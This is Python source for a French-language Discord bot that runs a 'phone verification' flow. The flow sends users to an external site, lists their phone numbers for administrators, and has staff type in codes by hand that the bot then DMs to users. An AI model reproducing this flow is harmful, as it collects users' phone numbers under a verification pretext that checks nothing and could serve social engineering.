"""
Commandes du bot Discord
"""
import discord
from discord.ext import commands
from discord.ui import Button, View
import secrets
from datetime import datetime, timedelta
import logging

import sys
from pathlib import Path
sys.path.append(str(Path(__file__).parent.parent))

from database import get_db, cleanup_expired
from config import (
    SITE_URL, ROLE_ID, SESSION_EXPIRY_HOURS,
    DEFAULT_WELCOME_TITLE, DEFAULT_WELCOME_DESCRIPTION,
    DEFAULT_INSTRUCTIONS, DEFAULT_PRIVACY, DEFAULT_COLOR
)

logger = logging.getLogger(__name__)

class VerifyButton(Button):
    def __init__(self):
        super().__init__(
            label="🔐 Vérifier mon compte",
            style=discord.ButtonStyle.primary,
            custom_id="persistent_verify_button"
        )

    async def callback(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        token = secrets.token_urlsafe(16)
        expires = datetime.utcnow() + timedelta(hours=SESSION_EXPIRY_HOURS)
        with get_db() as conn:
            conn.execute(
                "INSERT INTO verifications (token, user_id, expires_at) VALUES (?, ?, ?)",
                (token, interaction.user.id, expires)
            )
        link = f"{SITE_URL}/verify/{token}"
        embed = discord.Embed(
            title="📱 Vérification téléphonique",
            description="Clique sur le bouton ci-dessous pour commencer",
            color=0x5865F2
        )
        embed.add_field(name="⏰ Expiration", value=f"Ce lien expire dans {SESSION_EXPIRY_HOURS} heure")
        view = View()
        view.add_item(Button(label="✅ Commencer", url=link, style=discord.ButtonStyle.link))
        await interaction.followup.send(embed=embed, view=view, ephemeral=True)

class VerifyView(View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(VerifyButton())

async def setup_commands(bot):
    @bot.command(name="setup", aliases=["config"])
    @commands.has_permissions(administrator=True)
    async def setup_embed(ctx):
        embed = discord.Embed(
            title=DEFAULT_WELCOME_TITLE,
            description=DEFAULT_WELCOME_DESCRIPTION,
            color=DEFAULT_COLOR
        )
        embed.add_field(name="📋 Instructions", value=DEFAULT_INSTRUCTIONS, inline=False)
        embed.add_field(name="🔒 Confidentialité", value=DEFAULT_PRIVACY, inline=False)
        embed.set_footer(text="Clique sur le bouton ci-dessous")
        await ctx.send(embed=embed, view=VerifyView())
        await ctx.message.delete()
        logger.info(f"Embed créé par {ctx.author}")

    @bot.command(name="code")
    @commands.has_permissions(administrator=True)
    async def code_command(ctx, token: str = None, code: str = None):
        cleanup_expired()  # Nettoyage auto
        if not token:
            with get_db() as conn:
                cur = conn.execute(
                    """SELECT token, user_id, phone, expires_at 
                       FROM verifications 
                       WHERE phone IS NOT NULL AND code IS NULL 
                       ORDER BY expires_at DESC"""
                )
                pending = cur.fetchall()
            if not pending:
                await ctx.send(embed=discord.Embed(title="📋 Aucune demande en attente", color=0xFFA500))
                return
            embed = discord.Embed(title=f"📋 Demandes en attente ({len(pending)})", color=0x3498db)
            for p in pending[:5]:
                expires = datetime.fromisoformat(p[3])
                minutes = int((expires - datetime.utcnow()).total_seconds() / 60)
                embed.add_field(
                    name=f"Jeton: {p[0][:8]}...",
                    value=f"👤 <@{p[1]}>\n📞 {p[2]}\n⏰ Expire dans {minutes} min\n📝 `!code {p[0]} CODE`",
                    inline=False
                )
            await ctx.send(embed=embed)
            return

        if not code:
            await ctx.send("❌ Utilisation: `!code <jeton> <code>`")
            return

        with get_db() as conn:
            cur = conn.execute(
                "UPDATE verifications SET code = ?, staff_id = ? WHERE token = ? AND code IS NULL",
                (code, ctx.author.id, token)
            )
            if cur.rowcount == 0:
                await ctx.send("❌ Jeton invalide ou déjà utilisé")
                return
            cur = conn.execute("SELECT user_id, phone FROM verifications WHERE token = ?", (token,))
            user_id, phone = cur.fetchone()

        embed = discord.Embed(title="✅ Code enregistré", color=0x00FF00)
        embed.add_field(name="👤 Utilisateur", value=f"<@{user_id}>")
        embed.add_field(name="📞 Téléphone", value=f"`{phone}`")
        embed.add_field(name="🔑 Code", value=f"`{code}`")
        await ctx.send(embed=embed)

        try:
            user = await bot.fetch_user(user_id)
            mp_embed = discord.Embed(
                title="🔑 Code de vérification",
                description=f"Ton code secret est : **{code}**",
                color=0x00FF00
            )
            mp_embed.add_field(name="📝 Lien", value=f"{SITE_URL}/enter/{token}")
            await user.send(embed=mp_embed)
        except Exception as e:
            logger.error(f"Erreur MP: {e}")

    @bot.command(name="stats")
    @commands.has_permissions(administrator=True)
    async def stats_command(ctx):
        with get_db() as conn:
            total = conn.execute("SELECT COUNT(*) FROM verifications").fetchone()[0]
            pending = conn.execute("SELECT COUNT(*) FROM verifications WHERE phone IS NOT NULL AND code IS NULL").fetchone()[0]
            validated = conn.execute("SELECT COUNT(*) FROM verifications WHERE code IS NOT NULL").fetchone()[0]
        embed = discord.Embed(title="📊 Statistiques", color=0x3498db)
        embed.add_field(name="Total", value=str(total))
        embed.add_field(name="En attente", value=str(pending))
        embed.add_field(name="Validés", value=str(validated))
        await ctx.send(embed=embed)

    @bot.command(name="clean")
    @commands.has_permissions(administrator=True)
    async def clean_command(ctx):
        cleaned = cleanup_expired()
        await ctx.send(f"🧹 {cleaned} jetons expirés supprimés")

    return bot

def setup_views(bot):
    bot.add_view(VerifyView())
